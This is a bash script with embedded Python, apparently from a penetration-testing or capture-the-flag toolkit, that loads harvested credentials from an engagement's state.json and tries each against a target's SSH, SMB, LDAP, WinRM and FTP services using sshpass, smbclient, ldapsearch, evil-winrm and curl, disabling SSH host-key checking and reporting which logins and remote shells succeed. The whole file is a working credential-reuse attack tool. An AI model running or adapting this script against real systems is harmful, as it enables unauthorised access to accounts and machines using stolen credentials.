#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

ENG_DIR="${1:?usage: credential_matrix.sh <engagement_dir> <target_ip>}"

python3 - "$ENG_DIR" <<'PYEOF'
import json, sys, subprocess, os

eng_dir = sys.argv[1]
state_file = os.path.join(eng_dir, "state.json")
if not os.path.exists(state_file):
    print("state.json not found")
    sys.exit(1)

state = json.load(open(state_file))
creds = state.get("credentials", [])
hosts = state.get("hostnames", [])
target_ip = state.get("target_ip", "")

if not creds:
    print("No credentials to test")
    sys.exit(0)

services = []
for port_info in state.get("tcp_ports_services", {}).items():
    port_proto = port_info[0]
    svc = port_info[1]
    services.append(f"{port_proto} ({svc.get('service','')})")

print("=== Credential Matrix ===")
print(f"Testing {len(creds)} credential(s) across discovered services")
print(f"Targets: {target_ip} {' '.join(hosts)}")
print()

results = []
for cred in creds:
    username = cred.get("username", "")
    password = cred.get("value", "")
    cred_type = cred.get("type", "password")
    
    if not username or not password:
        if cred_type == "hash":
            results.append({"cred": cred, "action": "crack_hash", "note": "Needs john/hashcat"})
        elif cred_type == "key":
            results.append({"cred": cred, "action": "test_ssh_key", "note": "Test against SSH services"})
        continue
    
    for svc_key, svc in state.get("tcp_ports_services", {}).items():
        port = svc_key.split("/")[0]
        service = svc.get("service", "")
        
        tested = False
        if service in ("ssh", "SSH"):
            print(f"  SSH {port}: {username}:{password}")
            r = subprocess.run(["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no",
                                "-o", "ConnectTimeout=5", "-p", port, f"{username}@{target_ip}",
                                "echo SUCCESS"], capture_output=True, timeout=10)
            if b"SUCCESS" in r.stdout:
                print(f"    LOGIN SUCCESS on SSH {port}")
                results.append({"cred": cred, "service": f"ssh:{port}", "result": "success",
                                "ssh_user": username, "ssh_host": target_ip})
                tested = True
            else:
                print(f"    Failed (SSH {port})")
                tested = True
        
        if service in ("smb", "microsoft-ds", "netbios-ssn"):
            print(f"  SMB {port}: {username}:{password}")
            r = subprocess.run(["smbclient", "-L", f"//{target_ip}/", "-U", f"{username}%{password}",
                                "-p", port], capture_output=True, timeout=10)
            if b"Sharename" in r.stdout:
                print(f"    AUTH SUCCESS on SMB {port}")
                results.append({"cred": cred, "service": f"smb:{port}", "result": "success"})
                tested = True
            else:
                print(f"    Failed (SMB {port})")
                tested = True
        
        if service in ("ldap", "ldaps"):
            print(f"  LDAP {port}: {username}:{password}")
            r = subprocess.run(["ldapsearch", "-x", "-H", f"ldap://{target_ip}:{port}",
                                "-D", f"{username}@{hosts[0] if hosts else 'htb.local'}",
                                "-w", password, "-s", "base", "-b", ""],
                               capture_output=True, timeout=10)
            if r.returncode == 0:
                print(f"    BIND SUCCESS on LDAP {port}")
                results.append({"cred": cred, "service": f"ldap:{port}", "result": "success"})
                tested = True
            else:
                print(f"    Failed (LDAP {port})")
                tested = True
        
        if service in ("winrm", "WinRM", "wsman"):
            print(f"  WinRM {port}: {username}:{password}")
            r = subprocess.run(["evil-winrm", "-i", target_ip, "-P", str(port),
                                "-u", username, "-p", password, "-s"],
                               capture_output=True, timeout=10)
            if b"Evil-WinRM" in r.stdout:
                print(f"    AUTH SUCCESS on WinRM {port}")
                results.append({"cred": cred, "service": f"winrm:{port}", "result": "success",
                                "shell": {"user": username, "host": target_ip, "type": "winrm"}})
                tested = True
            else:
                print(f"    Failed (WinRM {port})")
                tested = True
        
        if service in ("ftp", "FTP"):
            print(f"  FTP {port}: {username}:{password}")
            r = subprocess.run(["curl", "-s", f"ftp://{username}:{password}@{target_ip}:{port}/",
                                "--max-time", "5"], capture_output=True, timeout=10)
            if b"230" in r.stdout or (r.returncode == 0 and len(r.stdout) > 0):
                print(f"    LOGIN SUCCESS on FTP {port}")
                results.append({"cred": cred, "service": f"ftp:{port}", "result": "success"})
                tested = True
            else:
                print(f"    Failed (FTP {port})")
                tested = True

if results:
    successes = [r for r in results if r.get("result") == "success"]
    shells = [r for r in results if r.get("shell")]
    print()
    print(f"=== RESULTS: {len(successes)} service(s) valid, {len(shells)} shell(s) ===")
    for r in successes:
        print(f"  {r.get('cred',{}).get('username','')}@{r.get('service','')}: VALID")
    for r in shells:
        print(f"  SHELL: {r.get('shell','')}")
    sys.exit(0)
else:
    print()
    print("No successful credential reuse found")
    sys.exit(1)
PYEOF
